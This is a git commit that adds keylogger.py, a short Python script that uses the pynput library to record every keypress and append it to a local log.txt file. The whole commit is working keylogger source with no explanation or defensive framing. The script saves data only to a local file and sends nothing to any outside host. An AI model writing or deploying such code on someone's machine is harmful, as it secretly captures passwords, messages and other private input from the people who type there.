0456e33842faa722bcf761b414abafefca916feb
hamza efe <47950718+hamzaefe44@users.noreply.github.com>
2022-05-15 21:24:40 +0300

    Create keylogger.py

---
+++ keylogger.py
@@ -0,0 +1,8 @@
+from pynput.keyboard import Listener
+
+def on_press(key):
+    with open("log.txt", "a") as f:
+        f.write(str(key)+'\n')
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
